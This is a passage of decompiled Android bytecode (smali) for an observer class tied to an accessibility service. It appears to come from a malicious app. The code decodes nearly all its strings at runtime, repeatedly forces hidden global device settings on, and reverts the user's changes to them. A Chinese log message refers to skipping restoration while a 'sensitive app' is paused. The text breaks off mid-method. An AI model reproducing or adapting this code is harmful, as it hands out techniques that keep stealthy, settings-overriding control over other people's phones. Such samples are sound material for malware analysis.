.class public final Lz/hf$atann;
.super Landroid/database/ContentObserver;
.source "r8-map-id-698ec2db7698d3a05f45ca7bd25479f75e72e3f151868426bc4d05779f175955"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lz/hf;-><init>(Landroid/accessibilityservice/AccessibilityService;Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x19
    name = null
.end annotation

.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000\u001d\n\u0000\n\u0002\u0018\u0002\n\u0002\u0010\u000b\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0002\u0008\u0003*\u0001\u0000\u0008\n\u0018\u00002\u00020\u0001J!\u0010\u0007\u001a\u00020\u00062\u0006\u0010\u0003\u001a\u00020\u00022\u0008\u0010\u0005\u001a\u0004\u0018\u00010\u0004H\u0016\u00a2\u0006\u0004\u0008\u0007\u0010\u0008\u00a8\u0006\t"
    }
    d2 = {
        "z/hf$atann",
        "Landroid/database/ContentObserver;",
        "",
        "selfChange",
        "Landroid/net/Uri;",
        "uri",
        "",
        "onChange",
        "(ZLandroid/net/Uri;)V",
        "app_release"
    }
    k = 0x1
    mv = {
        0x1,
        0x8,
        0x0
    }
    xi = 0x30
.end annotation


# instance fields
.field final synthetic aatfw:Lz/hf;


# direct methods
.method public constructor <init>(Lz/hf;Landroid/os/Handler;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 2
    .line 3
    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    .line 4
    .line 5
    .line 6
    return-void
.end method

.method public static synthetic aatfw(Lz/hf;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lz/hf$atann;->adwzbugqk(Lz/hf;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic abwuff(Lz/hf;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lz/hf$atann;->acgpossk(Lz/hf;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private static final acgpossk(Lz/hf;)V
    .locals 5

    .line 1
    const-string v0, "N+rBWAzl\n"

    .line 2
    .line 3
    const-string v1, "Q4KoKyjVGxk=\n"

    .line 4
    .line 5
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 6
    .line 7
    .line 8
    move-result-object v0

    .line 9
    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 10
    .line 11
    .line 12
    const-wide/16 v0, 0x320

    .line 13
    .line 14
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    .line 15
    .line 16
    .line 17
    sget-object v0, Lcom/nest/craft/spark/service/PlatformAssistDaemon;->mekit:Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;

    .line 18
    .line 19
    invoke-virtual {v0}, Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;->aklt()Z

    .line 20
    .line 21
    .line 22
    move-result v0

    .line 23
    if-nez v0, :cond_4

    .line 24
    .line 25
    invoke-static {p0}, Lz/hf;->ccuvjvbsoz(Lz/hf;)Z

    .line 26
    .line 27
    .line 28
    move-result v0

    .line 29
    if-eqz v0, :cond_0

    .line 30
    .line 31
    goto/16 :goto_2

    .line 32
    .line 33
    :cond_0
    invoke-virtual {p0}, Lz/hf;->hiodg()Z

    .line 34
    .line 35
    .line 36
    move-result v0

    .line 37
    if-eqz v0, :cond_1

    .line 38
    .line 39
    goto :goto_0

    .line 40
    :cond_1
    invoke-virtual {p0}, Lz/hf;->hptpzvhjh()Z

    .line 41
    .line 42
    .line 43
    move-result v0

    .line 44
    if-nez v0, :cond_2

    .line 45
    .line 46
    :goto_0
    return-void

    .line 47
    :cond_2
    invoke-static {p0}, Lz/hf;->bfg(Lz/hf;)Landroid/content/Context;

    .line 48
    .line 49
    .line 50
    move-result-object v0

    .line 51
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 52
    .line 53
    .line 54
    move-result-object v0

    .line 55
    const-string v1, "Fq4sWdIcBJgbryo=\n"

    .line 56
    .line 57
    const-string v2, "d8pOBrdyZfo=\n"

    .line 58
    .line 59
    invoke-static {v1, v2}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 60
    .line 61
    .line 62
    move-result-object v1

    .line 63
    const/4 v2, 0x1

    .line 64
    invoke-static {v0, v1, v2}, Landroid/provider/Settings$Global;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    .line 65
    .line 66
    .line 67
    const-string v1, "24wufgbgCKnljSJAE+ULpA==\n"

    .line 68
    .line 69
    const-string/jumbo v3, "uuhMIXGJbsA=\n"

    .line 70
    .line 71
    .line 72
    invoke-static {v1, v3}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 73
    .line 74
    .line 75
    move-result-object v1

    .line 76
    invoke-static {v0, v1, v2}, Landroid/provider/Settings$Global;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    .line 77
    .line 78
    .line 79
    const-wide/16 v3, 0x3e8

    .line 80
    .line 81
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    .line 82
    .line 83
    .line 84
    invoke-virtual {p0}, Lz/hf;->hqazwlcslx()Z

    .line 85
    .line 86
    .line 87
    move-result v1

    .line 88
    if-eqz v1, :cond_3

    .line 89
    .line 90
    sget-object v0, Lz/jo;->aatfw:Lz/jo;

    .line 91
    .line 92
    const-string/jumbo v1, "pJToWANTHWHMYh78al9GIvyNclsHfB15wcbVL2pxfSzBqrMfO9g=\n"

    .line 93
    .line 94
    .line 95
    const-string v2, "QSNavoLx+MU=\n"

    .line 96
    .line 97
    invoke-static {v1, v2}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 98
    .line 99
    .line 100
    move-result-object v1

    .line 101
    invoke-virtual {v0, v1}, Lz/jo;->ahdpsbxig(Ljava/lang/String;)V

    .line 102
    .line 103
    .line 104
    goto :goto_1

    .line 105
    :cond_3
    const-string v1, "IodhC+CCUfsjjGMx/4hV4i+McB3TiE/3JI5yCg==\n"

    .line 106
    .line 107
    const-string v3, "RuIXboztIZY=\n"

    .line 108
    .line 109
    invoke-static {v1, v3}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 110
    .line 111
    .line 112
    move-result-object v1

    .line 113
    invoke-static {v0, v1, v2}, Landroid/provider/Settings$Global;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    .line 114
    .line 115
    .line 116
    const-wide/16 v3, 0x12c

    .line 117
    .line 118
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    .line 119
    .line 120
    .line 121
    const-string/jumbo v1, "zWG65liFErvAYLw=\n"

    .line 122
    .line 123
    .line 124
    const-string/jumbo v3, "rAXYuT3rc9k=\n"

    .line 125
    .line 126
    .line 127
    invoke-static {v1, v3}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 128
    .line 129
    .line 130
    move-result-object v1

    .line 131
    invoke-static {v0, v1, v2}, Landroid/provider/Settings$Global;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    .line 132
    .line 133
    .line 134
    const-string/jumbo v1, "wxh9rNIpFPX9GXGSxywX+A==\n"

    .line 135
    .line 136
    .line 137
    const-string/jumbo v3, "onwf86VAcpw=\n"

    .line 138
    .line 139
    .line 140
    invoke-static {v1, v3}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 141
    .line 142
    .line 143
    move-result-object v1

    .line 144
    invoke-static {v0, v1, v2}, Landroid/provider/Settings$Global;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    .line 145
    .line 146
    .line 147
    sget-object v0, Lz/jo;->aatfw:Lz/jo;

    .line 148
    .line 149
    const-string v1, "OMj+DmmiQzJQPgiqAK4YcWDRZAF0gEIuaZnbXg28JnNS7qRobekmHzTe9cE=\n"

    .line 150
    .line 151
    const-string v2, "3X9M6OgAppY=\n"

    .line 152
    .line 153
    invoke-static {v1, v2}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 154
    .line 155
    .line 156
    move-result-object v1

    .line 157
    invoke-virtual {v0, v1}, Lz/jo;->ahdpsbxig(Ljava/lang/String;)V

    .line 158
    .line 159
    .line 160
    :goto_1
    const-wide/16 v0, 0x5dc

    .line 161
    .line 162
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    .line 163
    .line 164
    .line 165
    invoke-static {p0}, Lz/hf;->bolzggiu(Lz/hf;)Ljava/util/concurrent/atomic/AtomicInteger;

    .line 166
    .line 167
    .line 168
    move-result-object v0

    .line 169
    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicInteger;->get()I

    .line 170
    .line 171
    .line 172
    move-result v0

    .line 173
    invoke-static {p0, v0}, Lz/hf;->ccde(Lz/hf;I)V

    .line 174
    .line 175
    .line 176
    return-void

    .line 177
    :cond_4
    :goto_2
    sget-object p0, Lz/jo;->aatfw:Lz/jo;

    .line 178
    .line 179
    const-string v0, "38KDXSVslLNJsZY5RHJJ49zrjl0MVj10ir+zPA==\n"

    .line 180
    .line 181
    const-string v1, "OVcMu6Hz1cM=\n"

    .line 182
    .line 183
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 184
    .line 185
    .line 186
    move-result-object v0

    .line 187
    invoke-virtual {p0, v0}, Lz/jo;->ahdpsbxig(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 188
    .line 189
    .line 190
    return-void

    .line 191
    :catch_0
    move-exception p0

    .line 192
    sget-object v0, Lz/jo;->aatfw:Lz/jo;

    .line 193
    .line 194
    const-string v1, "WnTPPRCVvU0QFsFVco3YJB1mjFgT1Pp1V0/nPSKF\n"

    .line 195
    .line 196
    const-string/jumbo v2, "svNl2Jo9W8w=\n"

    .line 197
    .line 198
    .line 199
    invoke-static {v1, v2}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 200
    .line 201
    .line 202
    move-result-object v1

    .line 203
    invoke-virtual {v0, v1, p0}, Lz/jo;->bjbfx(Ljava/lang/String;Ljava/lang/Throwable;)V

    .line 204
    .line 205
    .line 206
    return-void
.end method

.method private static final adwzbugqk(Lz/hf;)V
    .locals 3

    .line 1
    const-string/jumbo v0, "hspZxMQZ\n"

    .line 2
    .line 3
    .line 4
    const-string v1, "8qIwt+Ap6F8=\n"

    .line 5
    .line 6
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 7
    .line 8
    .line 9
    move-result-object v0

    .line 10
    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 11
    .line 12
    .line 13
    :try_start_0
    invoke-static {p0}, Lz/hf;->bolzggiu(Lz/hf;)Ljava/util/concurrent/atomic/AtomicInteger;

    .line 14
    .line 15
    .line 16
    move-result-object v0

    .line 17
    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicInteger;->get()I

    .line 18
    .line 19
    .line 20
    move-result v0

    .line 21
    invoke-static {p0, v0}, Lz/hf;->ccde(Lz/hf;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 22
    .line 23
    .line 24
    return-void

    .line 25
    :catch_0
    move-exception p0

    .line 26
    sget-object v0, Lz/jo;->aatfw:Lz/jo;

    .line 27
    .line 28
    const-string v1, "4/aWWLE2kLKTvaQp5D/T2ITJzQCPcMKO7uSqWrQg\n"

    .line 29
    .line 30
    const-string v2, "C1govwyYdT0=\n"

    .line 31
    .line 32
    invoke-static {v1, v2}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 33
    .line 34
    .line 35
    move-result-object v1

    .line 36
    invoke-virtual {v0, v1, p0}, Lz/jo;->bjbfx(Ljava/lang/String;Ljava/lang/Throwable;)V

    .line 37
    .line 38
    .line 39
    return-void
.end method


# virtual methods
.method public onChange(ZLandroid/net/Uri;)V
    .locals 9

    .line 1
    const-string/jumbo p1, "\u654f\u611fApp\u6682\u505c \u8df3\u8fc7\u6062\u590d (paused="

    .line 2
    .line 3
    .line 4
    const-string/jumbo v0, "\u8bbe\u7f6e"

    .line 5
    .line 6
    .line 7
    if-eqz p2, :cond_0

    .line 8
    .line 9
    invoke-virtual {p2}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    .line 10
    .line 11
    .line 12
    move-result-object p2

    .line 13
    if-nez p2, :cond_1

    .line 14
    .line 15
    :cond_0
    const-string p2, "FKskHB6CDA==\n"

    .line 16
    .line 17
    const-string v1, "YcVPcnH1Ykc=\n"

    .line 18
    .line 19
    invoke-static {p2, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 20
    .line 21
    .line 22
    move-result-object p2

    .line 23
    :cond_1
    :try_start_0
    iget-object v1, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 24
    .line 25
    invoke-static {v1}, Lz/hf;->bfg(Lz/hf;)Landroid/content/Context;

    .line 26
    .line 27
    .line 28
    move-result-object v1

    .line 29
    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 30
    .line 31
    .line 32
    move-result-object v1

    .line 33
    invoke-virtual {p2}, Ljava/lang/String;->hashCode()I

    .line 34
    .line 35
    .line 36
    move-result v2

    .line 37
    const/4 v3, -0x1

    .line 38
    const/4 v4, 0x0

    .line 39
    const v5, -0x39d6645f

    .line 40
    .line 41
    .line 42
    const v6, -0x72226257

    .line 43
    .line 44
    .line 45
    const v7, -0x7d29d849

    .line 46
    .line 47
    .line 48
    if-eq v2, v7, :cond_6

    .line 49
    .line 50
    if-eq v2, v6, :cond_4

    .line 51
    .line 52
    if-eq v2, v5, :cond_2

    .line 53
    .line 54
    goto :goto_0

    .line 55
    :cond_2
    const-string v2, "Jcav6EYyOfgox6k=\n"

    .line 56
    .line 57
    const-string v8, "RKLNtyNcWJo=\n"

    .line 58
    .line 59
    invoke-static {v2, v8}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 60
    .line 61
    .line 62
    move-result-object v2

    .line 63
    invoke-virtual {p2, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 64
    .line 65
    .line 66
    move-result v2

    .line 67
    if-nez v2, :cond_3

    .line 68
    .line 69
    goto :goto_0

    .line 70
    :cond_3
    invoke-static {v1, p2, v4}, Landroid/provider/Settings$Global;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    .line 71
    .line 72
    .line 73
    move-result v1

    .line 74
    goto :goto_1

    .line 75
    :catch_0
    move-exception p1

    .line 76
    goto/16 :goto_7

    .line 77
    .line 78
    :cond_4
    const-string v2, "JA5CU+TowEYlBUBp++LEXykFU0XX4t5KIgdRUg==\n"

    .line 79
    .line 80
    const-string v8, "QGs0NoiHsCs=\n"

    .line 81
    .line 82
    invoke-static {v2, v8}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 83
    .line 84
    .line 85
    move-result-object v2

    .line 86
    invoke-virtual {p2, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 87
    .line 88
    .line 89
    move-result v2

    .line 90
    if-nez v2, :cond_5

    .line 91
    .line 92
    goto :goto_0

    .line 93
    :cond_5
    invoke-static {v1, p2, v4}, Landroid/provider/Settings$Global;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    .line 94
    .line 95
    .line 96
    move-result v1

    .line 97
    goto :goto_1

    .line 98
    :cond_6
    const-string v2, "bbzlXazVxRFTveljudDGHA==\n"

    .line 99
    .line 100
    const-string v8, "DNiHAtu8o3g=\n"

    .line 101
    .line 102
    invoke-static {v2, v8}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 103
    .line 104
    .line 105
    move-result-object v2

    .line 106
    invoke-virtual {p2, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 107
    .line 108
    .line 109
    move-result v2

    .line 110
    if-nez v2, :cond_7

    .line 111
    .line 112
    :goto_0
    move v1, v3

    .line 113
    goto :goto_1

    .line 114
    :cond_7
    invoke-static {v1, p2, v4}, Landroid/provider/Settings$Global;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    .line 115
    .line 116
    .line 117
    move-result v1

    .line 118
    :goto_1
    invoke-virtual {p2}, Ljava/lang/String;->hashCode()I

    .line 119
    .line 120
    .line 121
    move-result v2

    .line 122
    if-eq v2, v7, :cond_c

    .line 123
    .line 124
    if-eq v2, v6, :cond_a

    .line 125
    .line 126
    if-eq v2, v5, :cond_8

    .line 127
    .line 128
    goto :goto_2

    .line 129
    :cond_8
    const-string v2, "/B5IMAu77pTxH04=\n"

    .line 130
    .line 131
    const-string/jumbo v4, "nXoqb27Vj/Y=\n"

    .line 132
    .line 133
    .line 134
    invoke-static {v2, v4}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 135
    .line 136
    .line 137
    move-result-object v2

    .line 138
    invoke-virtual {p2, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 139
    .line 140
    .line 141
    move-result v2

    .line 142
    if-nez v2, :cond_9

    .line 143
    .line 144
    goto :goto_2

    .line 145
    :cond_9
    iget-object v2, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 146
    .line 147
    invoke-static {v2}, Lz/hf;->bsocljmojg(Lz/hf;)I

    .line 148
    .line 149
    .line 150
    move-result v2

    .line 151
    goto :goto_3

    .line 152
    :cond_a
    const-string v2, "3HSYOlRoMXPdf5oAS2I1atF/iSxnYi9/2n2LOw==\n"

    .line 153
    .line 154
    const-string/jumbo v4, "uBHuXzgHQR4=\n"

    .line 155
    .line 156
    .line 157
    invoke-static {v2, v4}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 158
    .line 159
    .line 160
    move-result-object v2

    .line 161
    invoke-virtual {p2, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 162
    .line 163
    .line 164
    move-result v2

    .line 165
    if-nez v2, :cond_b

    .line 166
    .line 167
    goto :goto_2

    .line 168
    :cond_b
    iget-object v2, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 169
    .line 170
    invoke-static {v2}, Lz/hf;->btzcnjle(Lz/hf;)I

    .line 171
    .line 172
    .line 173
    move-result v2

    .line 174
    goto :goto_3

    .line 175
    :cond_c
    const-string/jumbo v2, "iQbkcErdzI+3B+hOX9jPgg==\n"

    .line 176
    .line 177
    .line 178
    const-string v4, "6GKGLz20quY=\n"

    .line 179
    .line 180
    invoke-static {v2, v4}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 181
    .line 182
    .line 183
    move-result-object v2

    .line 184
    invoke-virtual {p2, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 185
    .line 186
    .line 187
    move-result v2

    .line 188
    if-nez v2, :cond_d

    .line 189
    .line 190
    :goto_2
    move v2, v3

    .line 191
    goto :goto_3

    .line 192
    :cond_d
    iget-object v2, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 193
    .line 194
    invoke-static {v2}, Lz/hf;->bsu(Lz/hf;)I

    .line 195
    .line 196
    .line 197
    move-result v2

    .line 198
    :goto_3
    if-ne v2, v3, :cond_14

    .line 199
    .line 200
    invoke-virtual {p2}, Ljava/lang/String;->hashCode()I

    .line 201
    .line 202
    .line 203
    move-result p1

    .line 204
    if-eq p1, v7, :cond_12

    .line 205
    .line 206
    if-eq p1, v6, :cond_10

    .line 207
    .line 208
    if-eq p1, v5, :cond_e

    .line 209
    .line 210
    goto/16 :goto_5

    .line 211
    .line 212
    :cond_e
    const-string p1, "SVFk9v3TlE9EUGI=\n"

    .line 213
    .line 214
    const-string v0, "KDUGqZi99S0=\n"

    .line 215
    .line 216
    invoke-static {p1, v0}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 217
    .line 218
    .line 219
    move-result-object p1

    .line 220
    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 221
    .line 222
    .line 223
    move-result p1

    .line 224
    if-nez p1, :cond_f

    .line 225
    .line 226
    goto/16 :goto_5

    .line 227
    .line 228
    :cond_f
    iget-object p1, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 229
    .line 230
    invoke-static {p1, v1}, Lz/hf;->chkr(Lz/hf;I)V

    .line 231
    .line 232
    .line 233
    return-void

    .line 234
    :cond_10
    const-string p1, "/VZ1dXJPkYb8XXdPbUWVn/BdZGNBRY+K+19mdA==\n"

    .line 235
    .line 236
    const-string/jumbo v0, "mTMDEB4g4es=\n"

    .line 237
    .line 238
    .line 239
    invoke-static {p1, v0}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 240
    .line 241
    .line 242
    move-result-object p1

    .line 243
    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 244
    .line 245
    .line 246
    move-result p1

    .line 247
    if-nez p1, :cond_11

    .line 248
    .line 249
    goto/16 :goto_5

    .line 250
    .line 251
    :cond_11
    iget-object p1, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 252
    .line 253
    invoke-static {p1, v1}, Lz/hf;->ck(Lz/hf;I)V

    .line 254
    .line 255
    .line 256
    return-void

    .line 257
    :cond_12
    const-string p1, "4ToYINkkCNTfOxQezCEL2Q==\n"

    .line 258
    .line 259
    const-string/jumbo v0, "gF56f65Nbr0=\n"

    .line 260
    .line 261
    .line 262
    invoke-static {p1, v0}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 263
    .line 264
    .line 265
    move-result-object p1

    .line 266
    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 267
    .line 268
    .line 269
    move-result p1

    .line 270
    if-nez p1, :cond_13

    .line 271
    .line 272
    goto/16 :goto_5

    .line 273
    .line 274
    :cond_13
    iget-object p1, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 275
    .line 276
    invoke-static {p1, v1}, Lz/hf;->cio(Lz/hf;I)V

    .line 277
    .line 278
    .line 279
    return-void

    .line 280
    :cond_14
    if-ne v1, v2, :cond_15

    .line 281
    .line 282
    goto/16 :goto_5

    .line 283
    .line 284
    :cond_15
    invoke-virtual {p2}, Ljava/lang/String;->hashCode()I

    .line 285
    .line 286
    .line 287
    move-result v3

    .line 288
    if-eq v3, v7, :cond_1a

    .line 289
    .line 290
    if-eq v3, v6, :cond_18

    .line 291
    .line 292
    if-eq v3, v5, :cond_16

    .line 293
    .line 294
    goto :goto_4

    .line 295
    :cond_16
    const-string v3, "czZ/XH9ICst+N3k=\n"

    .line 296
    .line 297
    const-string v4, "ElIdAxoma6k=\n"

    .line 298
    .line 299
    invoke-static {v3, v4}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 300
    .line 301
    .line 302
    move-result-object v3

    .line 303
    invoke-virtual {p2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 304
    .line 305
    .line 306
    move-result v3

    .line 307
    if-nez v3, :cond_17

    .line 308
    .line 309
    goto :goto_4

    .line 310
    :cond_17
    iget-object v3, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 311
    .line 312
    invoke-static {v3, v1}, Lz/hf;->chkr(Lz/hf;I)V

    .line 313
    .line 314
    .line 315
    goto :goto_4

    .line 316
    :cond_18
    const-string/jumbo v3, "tDIdDWIbp/a1OR83fRGj77k5DBtREbn6sjsODA==\n"

    .line 317
    .line 318
    .line 319
    const-string v4, "0FdraA5015s=\n"

    .line 320
    .line 321
    invoke-static {v3, v4}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 322
    .line 323
    .line 324
    move-result-object v3

    .line 325
    invoke-virtual {p2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 326
    .line 327
    .line 328
    move-result v3

    .line 329
    if-nez v3, :cond_19

    .line 330
    .line 331
    goto :goto_4

    .line 332
    :cond_19
    iget-object v3, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 333
    .line 334
    invoke-static {v3, v1}, Lz/hf;->ck(Lz/hf;I)V

    .line 335
    .line 336
    .line 337
    goto :goto_4

    .line 338
    :cond_1a
    const-string/jumbo v3, "odTg4T/qZ0af1ezfKu9kSw==\n"

    .line 339
    .line 340
    .line 341
    const-string/jumbo v4, "wLCCvkiDAS8=\n"

    .line 342
    .line 343
    .line 344
    invoke-static {v3, v4}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 345
    .line 346
    .line 347
    move-result-object v3

    .line 348
    invoke-virtual {p2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 349
    .line 350
    .line 351
    move-result v3

    .line 352
    if-nez v3, :cond_1b

    .line 353
    .line 354
    goto :goto_4

    .line 355
    :cond_1b
    iget-object v3, p0, Lz/hf$atann;->aatfw:Lz/hf;

    .line 356
    .line 357
    invoke-static {v3, v1}, Lz/hf;->cio(Lz/hf;I)V

    .line 358
    .line 359
    .line 360
    :goto_4
    sget-object v3, Lz/jo;->aatfw:Lz/jo;

    .line 361
    .line 362
    new-instance v4, Ljava/lang/StringBuilder;

    .line 363
    .line 364
    invoke-direct {v4, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 365
    .line 366
    .line 367
    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 368
    .line 369
    .line 370
    const-string v0, ": "

    .line 371
    .line 372
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 373
    .line 374
    .line 375
    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 376
    .line 377
    .line 378
    const-string v0, "->"

    .line 379
    .line 380
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 381
    .line 382
    .line 383
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 384
    .line 385
    .line 386
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 387
    .line 388
    .line 389
    move-result-object v0

    .line 390
    invoke-virtual {v3, v0}, Lz/jo;->ahdpsbxig(Ljava/lang/String;)V

    .line 391
    .line 392
    .line 393
    if-nez v1, :cond_20

    .line 394
    .line 395
    const-string v0, "7n+1tf/MgWTvdLeP4MaFfeN0pKPMxp9o6HamtA==\n"

    .line 396
    .line 397
    const-string/jumbo v1, "ihrD0JOj8Qk=\n"

    .line 398
    .line 399
    .line 400
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 401
    .line 402
    .line 403
    move-result-object v0

    .line 404
    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 405
    .line 406
    .line 407
    move-result v0

    .line 408
    if-nez v0, :cond_1c

    .line 409
    .line 410
    const-string/jumbo v0, "hfDpb5f/fM678eVRgvp/ww==\n"

    .line 411
    .line 412
    .line 413
    const-string v1, "5JSLMOCWGqc=\n"

    .line 414
    .line 415
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 416
    .line 417
    .line 418
    move-result-object v0

    .line 419
    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 420
    .line 421
    .line 422
    move-result v0

    .line 423
    if-nez v0, :cond_1c

    .line 424
    .line 425
    const-string v0, "3OmhQeh93PXR6Kc=\n"

    .line 426
    .line 427
    const-string/jumbo v1, "vY3DHo0TvZc=\n"

    .line 428
    .line 429
    .line 430
    invoke-static {v0, v1}, Lz/Dl;->aatfw(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 431
    .line 432
    .line 433
    move-result-object v0

    .line 434
    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 435
    .line 436
    .line 437
    move-result p2

    .line 438
    if-eqz p2, :cond_20

    .line 439
    .line 440
    :cond_1c
    sget-object p2, Lcom/nest/craft/spark/service/PlatformAssistDaemon;->mekit:Lcom/nest/craft/spark/service/PlatformAssistDaemon$aatfw;

    .line 441
    .line 442
